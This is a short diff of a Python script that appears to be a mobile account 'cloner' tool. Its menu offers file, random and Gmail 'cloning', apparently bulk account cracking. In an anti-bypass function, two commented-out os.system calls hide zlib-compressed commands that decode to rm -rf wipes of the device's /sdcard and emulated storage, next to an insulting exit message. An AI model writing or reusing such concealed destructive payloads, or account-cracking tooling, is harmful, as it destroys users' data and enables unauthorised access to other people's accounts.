@@ -164,11 +164,6 @@ def fucked():
 	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
 	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
 	print(' Fuck You Bypass User ');exit()
-	except:
-			sys.exit()
-def Spy():
-	clear()
-	#ckx()
 	print(f" [1] FILE Cloner (BEST) ")
 	print(f" [2] BD Random Cloner ")
 	print(f" [3] Gmail Cloning")
